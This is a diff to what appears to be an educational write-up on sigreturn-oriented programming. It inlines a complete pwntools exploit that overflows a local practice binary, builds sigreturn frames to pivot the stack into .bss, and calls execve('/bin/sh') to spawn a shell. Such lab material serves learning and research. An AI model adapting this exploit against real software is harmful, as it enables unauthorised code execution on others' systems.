@@ -104,4 +104,67 @@ frame will look something like this. We will also append a pointer to the
 
 After this ropchain executes, we'll call `execve('/bin/sh', {'/bin/sh', NULL}, NULL)`.
 
-See `exploit.py` for example code.
+Here's the code
+```
+from pwn import *
+
+r = process("./srop")
+e = ELF("./srop")
+rop = ROP(e)
+
+context.clear(arch='amd64')
+context.terminal = ["tmux", "splitw", "-h"]
+
+# Middle of the bss segment
+# We can't use the beginning because the stack grows downward
+# We can't use the end because the string we're writing grows upward
+writeable = e.bss() + (0x1000 // 2)
+
+# Sigreturn frame for stack pivot
+frame = SigreturnFrame()
+frame.rbp = writeable
+frame.rsp = writeable
+frame.rip = (e.symbols["main"])
+
+# Payload to execute stack pivot
+payload = 0x10*b'a'
+payload += p64(e.symbols["main"])
+payload += p64(rop.find_gadget(["syscall"])[0])
+payload += bytes(frame)
+
+# Sleep because I had issues with some sort of race condition
+r.sendline(payload)
+sleep(1)
+
+# Sigreturn is syscall 0xf
+# -1 due to the newline
+syscall = 0xf-1
+r.sendline(b'a'*syscall)
+sleep(1)
+
+# Sigreturn frame for calling execve
+frame = SigreturnFrame()
+frame.rbp = writeable
+frame.rsp = writeable
+frame.rip = (rop.find_gadget(["syscall"])[0])
+# Execve is syscall number 59
+frame.rax = 59
+# I just calculated these addresses in gdb
+frame.rdi = e.bss() + 0x908
+frame.rsi = e.bss() + 0x910
+frame.rdx = e.bss()
+
+# Payload to run execve
+payload = 0x10*b'b'
+payload += p64(e.symbols["main"])
+payload += p64(rop.find_gadget(["syscall"])[0])
+payload += bytes(frame) + b'/bin/sh\x00' + p64(e.bss() + 0x908) + p64(0)
+
+r.sendline(payload)
+sleep(1)
+
+syscall = 0xf-1
+r.sendline(b'c'*syscall)
+
+r.interactive()
+```
